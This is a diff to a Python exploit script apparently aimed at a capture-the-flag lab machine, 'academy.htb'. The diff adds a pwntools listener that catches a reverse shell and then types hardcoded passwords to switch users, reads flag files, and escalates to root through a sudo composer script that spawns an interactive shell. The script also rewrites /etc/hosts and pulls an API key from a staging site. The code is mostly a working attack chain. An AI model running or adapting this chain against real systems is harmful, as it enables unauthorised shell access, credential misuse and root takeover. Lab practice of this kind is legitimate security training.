@@ -3,7 +3,7 @@ from Crypto.Cipher import AES
 from hashlib import sha256
 from Crypto.Util.Padding import pad
 import hmac, json, base64, os, time, sys, rich, requests, re, argparse, pdb, socket, threading, subprocess, signal
-
+from pwn import *
 
 # Argument parser
 parser = argparse.ArgumentParser()
@@ -72,6 +72,26 @@ def MakeRequest():
                     os.system(f"echo '{rhost} dev-staging-01.academy.htb' >> /etc/hosts")
 
 def exploit_thread():
+    def catch_shell():
+        # Connect tot the reverse shell and send commands
+        shell = listen(4444, timeout=20).wait_for_connection()
+        shell.sendline("id")
+        shell.sendline("su cry0l1t3")
+        shell.sendline("mySup3rP4s5w0rd!!")
+        shell.sendline("cat /home/cry0l1t3/user.txt")
+        shell.sendline("id")
+        time.sleep(5)
+        shell.sendline("su mrb3n")
+        shell.sendline("mrb3n_Ac@d3my!")
+        time.sleep(2)
+        shell.sendline("TF=$(mktemp -d)")
+        shell.sendline("echo '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json")
+        shell.sendline("sudo -S composer --working-dir=$TF run-script x")
+        time.sleep(2)
+        shell.sendline("mrb3n_Ac@d3my!")
+        shell.sendline("cat /root/root.txt")
+        shell.interactive()
+
     def Exploit():
         # Extract API_KEY
         s = requests.get("http://dev-staging-01.academy.htb/")
@@ -141,26 +161,16 @@ def exploit_thread():
         except:
             rich.print("[red][!] Exploit failed [/red]")
 
-    t1 = threading.Thread(target=Exploit)
+    t1 = threading.Thread(target=catch_shell)
     t1.start()
-    t1.join()
 
-def shell():
-    def spawnShell():
-        if args.rev:
-            subprocess.Popen(["rlwrap", "nc", "-lvnp", "4444"])
-    t2 = threading.Thread(target=spawnShell)
+    t2 = threading.Thread(target=Exploit)
     t2.start()
     t2.join()
 
 if __name__ == "__main__":
     checkHosts()
-    shell()
     MakeRequest()
-    lport = 4444
     exploit_thread()
-
-
-
 
 
